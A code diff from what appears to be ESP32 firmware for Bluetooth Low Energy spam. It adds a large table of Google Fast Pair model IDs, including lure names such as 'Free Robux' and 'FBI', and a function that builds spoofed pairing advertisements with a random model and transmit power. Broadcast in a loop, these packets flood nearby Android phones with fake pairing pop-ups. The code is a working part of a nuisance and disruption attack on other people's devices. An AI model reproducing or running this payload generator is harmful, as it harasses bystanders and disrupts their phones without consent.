+    {{0x04, 0xAA, 0x91}}, // Beoplay H4
+    {{0x04, 0xAF, 0xB8}}, // JBL TUNE 720BT
+    {{0x05, 0xA9, 0x63}}, // WONDERBOOM 3
+    {{0x05, 0xAA, 0x91}}, // B&O Beoplay E6
+    {{0x05, 0xC4, 0x52}}, // JBL LIVE220BT
+    {{0x05, 0xC9, 0x5C}}, // Sony WI-1000X
+    {{0x06, 0x02, 0xF0}}, // JBL Everest 310GA
+    {{0x06, 0x03, 0xF0}}, // LG HBS-1700
+    {{0x1E, 0x8B, 0x18}}, // SRS-XB43
+    {{0x1E, 0x95, 0x5B}}, // WI-1000XM2
+    {{0x1E, 0xC9, 0x5C}}, // Sony WF-SP700N
+    {{0x1E, 0xD9, 0xF9}}, // JBL WAVE FLEX
+    {{0x1E, 0xE8, 0x90}}, // ATH-CKS30TW WH
+    {{0x1E, 0xED, 0xF5}}, // Teufel REAL BLUE TWS 3
+    {{0x1F, 0x11, 0x01}}, // TAG Heuer Calibre E4 45mm
+    {{0x1F, 0x18, 0x1A}}, // LinkBuds S
+    {{0x1F, 0x2E, 0x13}}, // Jabra Elite 2
+    {{0x1F, 0x45, 0x89}}, // Jabra Elite 2
+    {{0x1F, 0x46, 0x27}}, // SRS-XG300
+    {{0x1F, 0x58, 0x65}}, // boAt Airdopes 441
+    {{0x1F, 0xBB, 0x50}}, // WF-C700N
+    {{0x1F, 0xC9, 0x5C}}, // Sony WF-SP700N
+    {{0x1F, 0xE7, 0x65}}, // TONE-TF7Q
+    {{0x1F, 0xF8, 0xFA}}, // JBL REFLECT MINI NC
+    {{0x20, 0x1C, 0x7C}}, // SUMMIT
+    {{0x20, 0x2B, 0x3D}}, // Amazfit PowerBuds
+    {{0x20, 0x33, 0x0C}}, // SRS-XB33
+    {{0x00, 0x3B, 0x41}}, // M&D MW65
+    {{0x00, 0x3D, 0x8A}}, // Cleer FLOW Ⅱ
+    {{0x00, 0x5B, 0xC3}}, // Panasonic RP-HD610N
+    {{0x00, 0x8F, 0x7D}}, // soundcore Glow Mini
+    {{0x00, 0xFA, 0x72}}, // Pioneer SE-MS9BN
+    {{0x01, 0x00, 0xF0}}, // Bose QuietComfort 35 II
+    {{0x01, 0x12, 0x42}}, // Nirvana Ion
+    {{0x01, 0x3D, 0x8A}}, // Cleer EDGE Voice
+    {{0x01, 0xAA, 0x91}}, // Beoplay H9 3rd Generation
+    {{0x03, 0x8F, 0x16}}, // Beats Studio Buds
+    {{0x03, 0x9F, 0x8F}}, // Michael Kors Darci 5e
+    {{0x03, 0xAA, 0x91}}, // B&O Beoplay H8i
+    {{0x03, 0xB7, 0x16}}, // YY2963
+    {{0x03, 0xC9, 0x5C}}, // Sony WH-1000XM2
+    {{0x03, 0xC9, 0x9C}}, // MOTO BUDS 135
+    {{0x03, 0xF5, 0xD4}}, // Writing Account Key
+    {{0x04, 0x57, 0x54}}, // Plantronics PLT_K2
+    {{0x04, 0x57, 0x64}}, // PLT V8200 Series
+    {{0x04, 0xC9, 0x5C}}, // Sony WI-1000X
+    {{0x05, 0x0F, 0x0C}}, // Major III Voice
+    {{0x05, 0x2C, 0xC7}}, // MINOR III
+    {{0x05, 0x78, 0x02}}, // TicWatch Pro 5
+    {{0x05, 0x82, 0xFD}}, // Pixel Buds
+    {{0x05, 0x8D, 0x08}}, // WH-1000XM4
+    {{0x06, 0xAE, 0x20}}, // Galaxy S21 5G
+    {{0x06, 0xC1, 0x97}}, // OPPO Enco Air3 Pro
+    {{0x06, 0xC9, 0x5C}}, // Sony WH-1000XM2
+    {{0x06, 0xD8, 0xFC}}, // soundcore Liberty 4 NC
+    {{0x07, 0x44, 0xB6}}, // Technics EAH-AZ60M2
+    {{0x07, 0xA4, 0x1C}}, // WF-C700N
+    {{0x07, 0xC9, 0x5C}}, // Sony WH-1000XM2
+    {{0x07, 0xF4, 0x26}}, // Nest Hub Max
+    {{0x01, 0x02, 0xF0}}, // JBL Everest 110GA
+    {{0x02, 0x02, 0xF0}}, // JBL Everest 110GA
+    {{0x03, 0x02, 0xF0}}, // JBL Everest 310GA
+    {{0x04, 0x02, 0xF0}}, // JBL Everest 310GA
+    {{0x05, 0x02, 0xF0}}, // JBL Everest 310GA
+    {{0x07, 0x02, 0xF0}}, // JBL Everest 710GA
+    {{0x08, 0x02, 0xF0}}, // JBL Everest 710GA
+    {{0x05, 0x4B, 0x2D}}, // JBL TUNE125TWS
+    {{0x06, 0x60, 0xD7}}, // JBL LIVE770NC
+    {{0x01, 0x03, 0xF0}}, // LG HBS-835
+    {{0x02, 0x03, 0xF0}}, // LG HBS-830
+    {{0x03, 0x03, 0xF0}}, // LG HBS-930
+    {{0x04, 0x03, 0xF0}}, // LG HBS-1010
+    {{0x05, 0x03, 0xF0}}, // LG HBS-1500
+    {{0x07, 0x03, 0xF0}}, // LG HBS-1120
+    {{0x08, 0x03, 0xF0}}, // LG HBS-1125
+    {{0x09, 0x03, 0xF0}}, // LG HBS-2000
+    {{0x07, 0x1C, 0x74}}, // JBL Flip 6
+    {{0x0D, 0xC6, 0xBF}}, // My Awesome Device II
+    {{0x0D, 0xC9, 0x5C}}, // Sony WH-1000XM3
+    {{0x0D, 0xEC, 0x2B}}, // Emporio Armani EA Connected
+    {{0x0E, 0x13, 0x8D}}, // WF-SP800N
+    {{0x0E, 0xC9, 0x5C}}, // Sony WI-C600N
+    {{0x0E, 0xCE, 0x95}}, // Philips TAT3508
+    {{0x0F, 0x09, 0x93}}, // COUMI TWS-834A
+    {{0x0F, 0x1B, 0x8D}}, // JBL VIBE BEAM
+    {{0x0F, 0x23, 0x2A}}, // JBL TUNE BUDS
+    {{0x0F, 0x2D, 0x16}}, // WH-CH520
+    {{0x20, 0xA1, 0x9B}}, // WF-SP800N
+    {{0x20, 0xC9, 0x5C}}, // Sony WF-SP700N
+    {{0x20, 0xCC, 0x2C}}, // SRS-XB43
+    {{0x21, 0x3C, 0x8C}}, // DIZO Wireless Power
+    {{0x21, 0x52, 0x1D}}, // boAt Rockerz 355 (Green)
+    {{0x21, 0xA0, 0x4E}}, // oraimo FreePods Pro
+    {{0x5B, 0xA9, 0xB5}}, // WF-SP800N
+    {{0x5B, 0xAC, 0xD6}}, // Bose QC Ultra Earbuds
+    {{0x5B, 0xD6, 0xC9}}, // JBL TUNE225TWS
+    {{0x5B, 0xE3, 0xD4}}, // JBL Flip 6
+    {{0x5C, 0x02, 0x06}}, // UA | JBL TWS STREAK
+    {{0x5C, 0x0C, 0x84}}, // JBL TUNE225TWS
+    {{0x5C, 0x48, 0x33}}, // WH-CH720N
+    {{0x5C, 0x4A, 0x7E}}, // LG HBS-XL7
+    {{0x5C, 0x55, 0xE7}}, // TCL MOVEAUDIO S200
+    {{0x5C, 0x7C, 0xDC}}, // WH-1000XM5
+    {{0x5C, 0x8A, 0xA5}}, // JBL LIVE220BT
+    {{0x5C, 0xC9, 0x00}}, // Sony WF-1000X
+    {{0x5C, 0xC9, 0x01}}, // Sony WF-1000X
+    {{0x5C, 0xC9, 0x02}}, // Sony WH-1000XM2
+    {{0x5C, 0xC9, 0x03}}, // Sony WH-1000XM2
+    {{0x5C, 0xC9, 0x04}}, // Sony WI-1000X
+    {{0x5C, 0xC9, 0x05}}, // Sony WI-1000X
+    {{0x5C, 0xC9, 0x06}}, // Sony WH-1000XM2
+    {{0x5C, 0xC9, 0x07}}, // Sony WH-1000XM2
+    {{0x5C, 0xC9, 0x08}}, // Sony WI-1000X
+    {{0x5C, 0xC9, 0x09}}, // Sony WI-1000X
+    {{0x5C, 0xC9, 0x0A}}, // Sony WH-1000XM3
+    {{0x5C, 0xC9, 0x0B}}, // Sony WH-1000XM3
+    {{0x5C, 0xC9, 0x0C}}, // Sony WH-1000XM3
+    {{0x5C, 0xC9, 0x0D}}, // Sony WH-1000XM3
+    {{0x5C, 0xC9, 0x0E}}, // Sony WI-C600N
+    {{0x5C, 0xC9, 0x0F}}, // Sony WI-C600N
+    {{0x5C, 0xC9, 0x10}}, // Sony WI-C600N
+    {{0x5C, 0xC9, 0x11}}, // Sony WI-C600N
+    {{0x5C, 0xC9, 0x12}}, // Sony WI-C600N
+    {{0x5C, 0xC9, 0x13}}, // Sony WI-C600N
+    {{0x5C, 0xC9, 0x14}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x15}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x16}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x17}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x18}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x19}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x1A}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x1B}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x1C}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x1D}}, // Sony WI-SP600N
+    {{0x5C, 0xC9, 0x1E}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x1F}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x20}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x21}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x22}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x23}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x24}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x25}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x26}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x27}}, // Sony WF-SP700N
+    {{0x5C, 0xC9, 0x28}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x29}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x2A}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x2B}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x2C}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x2D}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x2E}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x2F}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x30}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x31}}, // Sony WH-H900N
+    {{0x5C, 0xC9, 0x32}}, // Sony WH-CH700N
+    {{0x5C, 0xC9, 0x33}}, // Sony WH-CH700N
+    {{0x5C, 0xC9, 0x34}}, // Sony WH-CH700N
+    {{0x5C, 0xC9, 0x35}}, // Sony WH-CH700N
+    {{0x5C, 0xC9, 0x36}}, // Sony WH-CH700N
+    {{0x5C, 0xC9, 0x37}}, // Sony WH-CH700N
+    {{0x5C, 0xC9, 0x38}}, // Sony WF-1000XM3
+    {{0x5C, 0xC9, 0x39}}, // Sony WF-1000XM3
+    {{0x5C, 0xC9, 0x3A}}, // Sony WF-1000XM3
+    {{0x5C, 0xC9, 0x3B}}, // Sony WF-1000XM3
+    {{0x5C, 0xC9, 0x3C}}, // Sony WH-XB700
+    {{0x5C, 0xC9, 0x3D}}, // Sony WH-XB700
+    {{0x5C, 0xC9, 0x3E}}, // Sony WH-XB700
+    {{0x5C, 0xC9, 0x3F}}, // Sony WH-XB700
+    {{0x5C, 0xC9, 0x40}}, // Sony WH-XB900N
+    {{0x5C, 0xC9, 0x41}}, // Sony WH-XB900N
+    {{0x5C, 0xC9, 0x42}}, // Sony WH-XB900N
+    {{0x5C, 0xC9, 0x43}}, // Sony WH-XB900N
+    {{0x5C, 0xC9, 0x44}}, // Sony WH-XB900N
+    {{0x5C, 0xC9, 0x45}}, // Sony WH-XB900N
+    {{0x5C, 0xEE, 0x3C}}, // Fitbit Charge 4
+    {{0x6A, 0xD2, 0x26}}, // TicWatch Pro 3
+    {{0x6B, 0x1C, 0x64}}, // Pixel Buds
+    {{0x6B, 0x8C, 0x65}}, // oraimo FreePods 4
+    {{0x6B, 0x93, 0x04}}, // Nokia SB-101
+    {{0x6B, 0xA5, 0xC3}}, // Jabra Elite 4
+    {{0x6C, 0x42, 0xC0}}, // TWS05
+    {{0x6C, 0x4D, 0xE5}}, // JBL LIVE PRO 2 TWS
+    {{0x89, 0xBA, 0xD5}}, // Galaxy A23 5G
+    {{0x8A, 0x31, 0xB7}}, // Bose QC Ultra Headphones
+    {{0x8A, 0x3D, 0x00}}, // Cleer FLOW Ⅱ
+    {{0x8A, 0x3D, 0x01}}, // Cleer EDGE Voice
+    {{0x8A, 0x8F, 0x23}}, // WF-1000XM5
+    {{0x8A, 0xAD, 0xAE}}, // JLab GO Work 2
+    {{0x8B, 0x0A, 0x91}}, // Jabra Elite 5
+    {{0x8B, 0x5A, 0x7B}}, // TicWatch Pro 3 GPS
+    {{0x8B, 0x66, 0xAB}}, // Pixel Buds A-Series
+    {{0x8B, 0xB0, 0xA0}}, // Nokia Solo Bud+
+    {{0x8B, 0xF7, 0x9A}}, // Oladance Whisper E1
+    {{0x8C, 0x07, 0xD2}}, // Jabra Elite 4 Active
+    {{0x8C, 0x17, 0x06}}, // YY7861E
+    {{0x8C, 0x42, 0x36}}, // GLIDiC mameBuds
+    {{0x8C, 0x6B, 0x6A}}, // realme Buds Air 3S
+    {{0x8C, 0xAD, 0x81}}, // KENWOOD WS-A1
+    {{0x8C, 0xB0, 0x5C}}, // JBL LIVE PRO+ TWS
+    {{0x8C, 0xD1, 0x0F}}, // realme Buds Air Pro
+    {{0x8D, 0x13, 0xB9}}, // BLE-TWS
+    {{0x8D, 0x16, 0xEA}}, // Galaxy M14 5G
+    {{0x8D, 0x5B, 0x67}}, // Pixel 90c
+    {{0x8E, 0x14, 0xD7}}, // LG-TONE-TFP8
+    {{0x8E, 0x19, 0x96}}, // Galaxy A24 5g
+    {{0x8E, 0x46, 0x66}}, // Oladance Wearable Stereo
+    {{0x8E, 0x55, 0x50}}, // boAt Airdopes 511v2
+    {{0x91, 0x01, 0xF0}}, // Jabra Elite 2
+    {{0x91, 0x28, 0xCB}}, // TCL MOVEAUDIO Neo
+    {{0x91, 0x3B, 0x0C}}, // YH-E700B
+    {{0x91, 0x5C, 0xFA}}, // Galaxy A14
+    {{0x91, 0x71, 0xBE}}, // Jabra Evolve2 65 Flex
+    {{0x91, 0x7E, 0x46}}, // LinkBuds
+    {{0x91, 0xAA, 0x00}}, // Beoplay E8 2.0
+    {{0x91, 0xAA, 0x01}}, // Beoplay H9 3rd Generation
+    {{0x91, 0xAA, 0x02}}, // B&O Earset
+    {{0x91, 0xAA, 0x03}}, // B&O Beoplay H8i
+    {{0x91, 0xAA, 0x04}}, // Beoplay H4
+    {{0x91, 0xAA, 0x05}}, // B&O Beoplay E6
+    {{0x91, 0xBD, 0x38}}, // LG HBS-FL7
+    {{0x91, 0xC8, 0x13}}, // JBL TUNE770NC
+    {{0x91, 0xDA, 0xBC}}, // SRS-XB33
+    {{0x92, 0x25, 0x5E}}, // LG-TONE-FP6
+    {{0x98, 0x9D, 0x0A}}, // Set up your new Pixel 2
+    {{0x99, 0x39, 0xBC}}, // ATH-SQ1TW
+    {{0x99, 0x43, 0x74}}, // EDIFIER W320TN
+    {{0x99, 0x7B, 0x4A}}, // UA | JBL True Wireless Flash X
+    {{0x99, 0xC8, 0x7B}}, // WH-H810 (h.ear)
+    {{0x99, 0xD7, 0xEA}}, // oraimo OpenCirclet
+    {{0x99, 0xF0, 0x98}}, // Galaxy S22 Ultra
+    {{0x9A, 0x40, 0x8A}}, // MOTO BUDS 065
+    {{0x9A, 0x9B, 0xDD}}, // WH-XB910N
+    {{0x9A, 0xDB, 0x11}}, // Pixel Buds Pro
+    {{0x9A, 0xEE, 0xA4}}, // LG HBS-FN4
+    {{0x9B, 0x73, 0x39}}, // AKG N9 Hybrid
+    {{0x9B, 0x73, 0x5A}}, // JBL RFL FLOW PRO
+    {{0x9B, 0x98, 0x72}}, // Hyundai
+    {{0x9B, 0xC6, 0x4D}}, // JBL TUNE225TWS
+    {{0x9B, 0xE9, 0x31}}, // WI-C100
+    {{0x9C, 0x0A, 0xF7}}, // JBL VIBE BUDS
+    {{0x9C, 0x39, 0x97}}, // ATH-M50xBT2
+    {{0x9C, 0x40, 0x58}}, // JBL WAVE FLEX
+    {{0x9C, 0x6B, 0xC0}}, // LinkBuds S
+    {{0x9C, 0x88, 0x8B}}, // WH-H910N (h.ear)
+    {{0x9C, 0x98, 0xDB}}, // JBL TUNE225TWS
+    {{0x9C, 0xA2, 0x77}}, // YY2963
+    {{0x9C, 0xB5, 0xF3}}, // WH-1000XM5
+    {{0x9C, 0xB8, 0x81}}, // soundcore Motion 300
+    {{0x9C, 0xD0, 0xF3}}, // LG HBS-TFN7
+    {{0x9C, 0xE3, 0xC7}}, // EDIFIER NeoBuds Pro 2
+    {{0x9C, 0xEF, 0xD1}}, // SRS-XG500
+    {{0x9C, 0xF0, 0x8F}}, // JLab Epic Air ANC
+    {{0x9D, 0x00, 0xA6}}, // Urbanears Juno
+    {{0x9D, 0x7D, 0x42}}, // Galaxy S20
+    {{0x9D, 0xB8, 0x96}}, // Your BMW
+    {{0xA7, 0xE5, 0x2B}}, // Bose NC 700 Headphones
+    {{0xA7, 0xEF, 0x76}}, // JBL CLUB PRO+ TWS
+    {{0xA8, 0x00, 0x1A}}, // JBL CLUB ONE
+    {{0xA8, 0x3C, 0x10}}, // adidas Z.N.E. 01
+    {{0xA8, 0x65, 0x8F}}, // ROCKSTER GO
+    {{0xA8, 0x84, 0x5A}}, // oraimo FreePods 4
+    {{0xA8, 0x8B, 0x69}}, // WF-SP800N
+    {{0xA8, 0xA0, 0x0E}}, // Nokia CB-201
+    {{0xA8, 0xA7, 0x2A}}, // JBL LIVE670NC
+    {{0xA8, 0xC6, 0x36}}, // JBL TUNE660NC
+    {{0xA8, 0xCA, 0xAD}}, // Galaxy F04
+    {{0xA8, 0xE3, 0x53}}, // JBL TUNE BEAM
+    {{0xA8, 0xF9, 0x6D}}, // JBL ENDURANCE RUN 2 WIRELESS
+    {{0xA9, 0x03, 0x58}}, // JBL LIVE220BT
+    {{0xA9, 0x24, 0x98}}, // JBL WAVE BUDS
+    {{0xA9, 0x39, 0x4A}}, // JBL TUNE230NC TWS
+    {{0xC6, 0x93, 0x6A}}, // JBL LIVE PRO+ TWS
+    {{0xC6, 0x9A, 0xFD}}, // WF-H800 (h.ear)
+    {{0xC6, 0xAB, 0xEA}}, // UA | JBL True Wireless Flash X
+    {{0xC6, 0xEC, 0x5F}}, // SRS-XE300
+    {{0xC7, 0x73, 0x6C}}, // Philips PH805
+    {{0xC7, 0x9B, 0x91}}, // Jabra Evolve2 75
+    {{0xC7, 0xA2, 0x67}}, // Fake Test Mouse
+    {{0xC7, 0xD6, 0x20}}, // JBL Pulse 5
+    {{0xC7, 0xFB, 0xCC}}, // JBL VIBE FLEX
+    {{0xC8, 0x16, 0x2A}}, // LinkBuds S
+    {{0xC8, 0x5D, 0x7A}}, // JBL ENDURANCE PEAK II
+    {{0xC8, 0x77, 0x7E}}, // Jaybird Vista 2
+    {{0xC8, 0x78, 0xAA}}, // SRS-XV800
+    {{0xC8, 0xC6, 0x41}}, // Redmi Buds 4 Lite
+    {{0xC8, 0xD3, 0x35}}, // WF-1000XM4
+    {{0xC8, 0xE2, 0x28}}, // Pixel Buds Pro
+    {{0xC9, 0x18, 0x6B}}, // WF-1000XM4
+    {{0xC9, 0x83, 0x6A}}, // JBL Xtreme 4
+    {{0xCA, 0x70, 0x30}}, // ATH-TWX7
+    {{0xCA, 0xB6, 0xB8}}, // ATH-M20xBT
+    {{0xCA, 0xF5, 0x11}}, // Jaybird Vista 2
+    {{0xCB, 0x09, 0x3B}}, // Urbanears Juno
+    {{0xCB, 0x52, 0x9D}}, // soundcore Glow
+    {{0xCC, 0x43, 0x8E}}, // WH-1000XM4
+    {{0xCC, 0x5F, 0x29}}, // JBL TUNE660NC
+    {{0xCC, 0x75, 0x4F}}, // YY2963
+    {{0xCC, 0x93, 0xA5}}, // Sync
+    {{0xCC, 0xBB, 0x7E}}, // MIDDLETON
+    {{0xD5, 0xA5, 0x9E}}, // Jabra Elite Speaker
+    {{0xD5, 0xB5, 0xF7}}, // MOTO BUDS 600 ANC
+    {{0xD5, 0xC6, 0xCE}}, // realme TechLife Buds T100
+    {{0xD6, 0x54, 0xCD}}, // JBL Xtreme 4
+    {{0xD6, 0x5F, 0x4E}}, // Philips Fidelio T2
+    {{0xD6, 0x9B, 0x2B}}, // TONE-T80S
+    {{0xD6, 0xC1, 0x95}}, // LG HBS-SL5
+    {{0xD6, 0xE8, 0x70}}, // Beoplay EX
+    {{0xD6, 0xEE, 0x84}}, // Rockerz 255 Max
+    {{0xD7, 0x10, 0x2F}}, // ATH-SQ1TW SVN
+    {{0xD7, 0xE3, 0xEB}}, // Cleer HALO
+    {{0xD8, 0x05, 0x8C}}, // MOTIF II A.N.C.
+    {{0xD8, 0x20, 0xEA}}, // WH-XB910N
+    {{0xD8, 0x7A, 0x3E}}, // Pixel Buds Pro
+    {{0xD8, 0xF3, 0xBA}}, // WH-1000XM5
+    {{0xD8, 0xF4, 0xE8}}, // realme Buds T100
+    {{0xD9, 0x06, 0x17}}, // Redmi Buds 4 Active
+    {{0xD9, 0x33, 0xA7}}, // JBL ENDURANCE PEAK 3
+    {{0xD9, 0x41, 0x4F}}, // JBL SOUNDGEAR SENSE
+    {{0xD9, 0x7E, 0xBA}}, // JBL TUNE125TWS
+    {{0xD9, 0x96, 0x4B}}, // JBL TUNE670NC
+    {{0xDA, 0x0F, 0x83}}, // SPACE
+    {{0xDA, 0x45, 0x77}}, // Jabra Elite 4 Active
+    {{0xDA, 0x52, 0x00}}, // blackbox TRIP II
+    {{0xDA, 0xD3, 0xA6}}, // Jabra Elite 10
+    {{0xDA, 0xDE, 0x43}}, // Chromebox
+    {{0xDA, 0xE0, 0x96}}, // adidas RPT-02 SOL
+    {{0xDB, 0x8A, 0xC7}}, // LG TONE-FREE
+    {{0xDB, 0xE5, 0xB1}}, // WF-1000XM4
+    {{0xDC, 0x52, 0x49}}, // WH-H810 (h.ear)
+    {{0xDC, 0xF3, 0x3C}}, // JBL REFLECT MINI NC
+    {{0xDD, 0x4E, 0xC0}}, // OPPO Enco Air3 Pro
+    {{0xDE, 0x21, 0x5D}}, // WF-C500
+    {{0xDE, 0x57, 0x7F}}, // Teufel AIRY TWS 2
+    {{0xDE, 0xC0, 0x4C}}, // SUMMIT
+    {{0xDE, 0xDD, 0x6F}}, // soundcore Space One
+    {{0xDE, 0xE8, 0xC0}}, // Ear (2)
+    {{0xDE, 0xEA, 0x86}}, // Xiaomi Buds 4 Pro
+    {{0xDE, 0xF2, 0x34}}, // WH-H810 (h.ear)
+    {{0xDF, 0x01, 0xE3}}, // Sync
+    {{0xDF, 0x27, 0x1C}}, // Big Bang e Gen 3
+    {{0xDF, 0x42, 0xDE}}, // TAG Heuer Calibre E4 42mm
+    {{0xDF, 0x4B, 0x02}}, // SRS-XB13
+    {{0xDF, 0x9B, 0xA4}}, // Bose NC 700 Headphones
+    {{0xDF, 0xD4, 0x33}}, // JBL REFLECT AERO
+    {{0xE0, 0x20, 0xC1}}, // soundcore Motion 300
+    {{0xE0, 0x61, 0x16}}, // LinkBuds S
+    {{0xE0, 0x76, 0x34}}, // OnePlus Buds Z
+    {{0xE0, 0x91, 0x72}}, // JBL TUNE BEAM
+    {{0xE4, 0xE4, 0x57}}, // Galaxy S20 5G
+    {{0xE5, 0x44, 0x0B}}, // TAG Heuer Calibre E4 45mm
+    {{0xE5, 0x73, 0x63}}, // Oladance Wearable Stereo
+    {{0xE5, 0x7B, 0x57}}, // Super Device
+    {{0xE5, 0xB4, 0xB0}}, // WF-1000XM5
+    {{0xE5, 0xB9, 0x1B}}, // SRS-XB33
+    {{0xE5, 0xE2, 0xE9}}, // Zone Wireless 2
+    {{0xE6, 0x46, 0x13}}, // JBL WAVE BEAM
+    {{0xE6, 0x4C, 0xC6}}, // Set up your new Pixel 3 XL
+    {{0xE6, 0x98, 0x77}}, // JBL REFLECT AERO
+    {{0xE6, 0xE3, 0x7E}}, // realme Buds  Air 5 Pro
+    {{0xE6, 0xE7, 0x71}}, // ATH-CKS50TW
+    {{0xE6, 0xE8, 0xB8}}, // POCO Pods
+    {{0xE7, 0x50, 0xCE}}, // Jabra Evolve2 75
+    {{0x00, 0x52, 0xDA}}, // blackbox TRIP II
+    {{0x10, 0x92, 0x01}}, // Beoplay H9 3rd Generation
+    {{0x12, 0x43, 0x66}}, // BLE-Phone
+    {{0x12, 0x66, 0x44}}, // WH-1000XM4
+    {{0x28, 0x45, 0x00}}, // Plantronics PLT_K2
+    {{0x53, 0x20, 0x11}}, // Big Bang e Gen 3
+    {{0x54, 0x95, 0x47}}, // JBL WAVE BUDS
+    {{0x56, 0x76, 0x79}}, // Pixel Buds Pro
+    {{0x57, 0x58, 0x36}}, // Sony WI-1000X
+    {{0x59, 0x60, 0x07}}, // MOTIF II A.N.C.
+    {{0x61, 0x29, 0x07}}, // Redmi Buds 4 Lite
+    {{0x61, 0x41, 0x99}}, // Oraimo FreePods Pro
+    {{0x62, 0x57, 0x40}}, // LG-TONE-NP3
+    {{0x64, 0x13, 0x72}}, // Sony WI-1000X
+    {{0x64, 0x16, 0x30}}, // boAt Airdopes 452
+    {{0x66, 0x44, 0x54}}, // JBL TUNE 520BT
+    {{0x70, 0x69, 0x08}}, // Sony WH-1000XM3
+    {{0x83, 0x79, 0x80}}, // Sony WH-1000XM3
+    {{0x85, 0x53, 0x47}}, // NIRVANA NEBULA
+    {{0x86, 0x16, 0x98}}, // LinkBuds
+    {{0xCB, 0x2F, 0xE7}}, // soundcore Motion X500
+    {{0xD9, 0x9C, 0xA1}}, // Flipper Zero
+    {{0x77, 0xFF, 0x67}}, // Free Robux
+    {{0xAA, 0x18, 0x7F}}, // Free VBucks
+    {{0xDC, 0xE9, 0xEA}}, // Rickroll
+    {{0x87, 0xB2, 0x5F}}, // Animated Rickroll
+    {{0x14, 0x48, 0xC9}}, // BLM
+    {{0x13, 0xB3, 0x9D}}, // Talking Sasquach
+    {{0x7C, 0x6C, 0xDB}}, // Obama
+    {{0x00, 0x5E, 0xF9}}, // Ryanair
+    {{0xE2, 0x10, 0x6F}}, // FBI
+    {{0xB3, 0x7A, 0x62}}, // Tesla
+    {{0x92, 0xAD, 0xC9}}, // Ton Upgrade Netflix
 };
 #define ANDROID_MODELS_COUNT (sizeof(ANDROID_MODELS) / sizeof(ANDROID_MODELS[0]))
 
+static const uint8_t ANDROID_PACKET_TEMPLATE[ANDROID_PAYLOAD_SIZE] = {
+    0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00, 0x02, 0x0A, 0x00};
+
 int generate_android_payload(uint8_t *buffer, size_t max_len) {
-  if (buffer == NULL)
+  if (buffer == NULL || max_len < ANDROID_PAYLOAD_SIZE)
     return 0;
 
-  uint32_t model = ANDROID_MODELS[esp_random() % ANDROID_MODELS_COUNT].value;
-  uint8_t packet[ANDROID_PAYLOAD_SIZE] = {0x03,
-                                          0x03,
-                                          0x2C,
-                                          0xFE,
-                                          0x06,
-                                          0x16,
-                                          0x2C,
-                                          0xFE,
-                                          (uint8_t)((model >> 0x10) & 0xFF),
-                                          (uint8_t)((model >> 0x08) & 0xFF),
-                                          (uint8_t)((model >> 0x00) & 0xFF),
-                                          0x02,
-                                          0x0A,
-                                          (uint8_t)((esp_random() % 120) - 100)};
-  if (max_len < ANDROID_PAYLOAD_SIZE)
-    return 0;
-  memcpy(buffer, packet, ANDROID_PAYLOAD_SIZE);
+  const android_spam_device_t *model = &ANDROID_MODELS[esp_random() % ANDROID_MODELS_COUNT];
+  memcpy(buffer, ANDROID_PACKET_TEMPLATE, sizeof(ANDROID_PACKET_TEMPLATE));
+  memcpy(buffer + ANDROID_MODEL_OFFSET, model->bytes, sizeof(model->bytes));
+  buffer[ANDROID_TX_POWER_OFFSET] =
+      (uint8_t)((esp_random() % ANDROID_TX_POWER_RANGE) - ANDROID_TX_POWER_BIAS);
   return ANDROID_PAYLOAD_SIZE;
 }
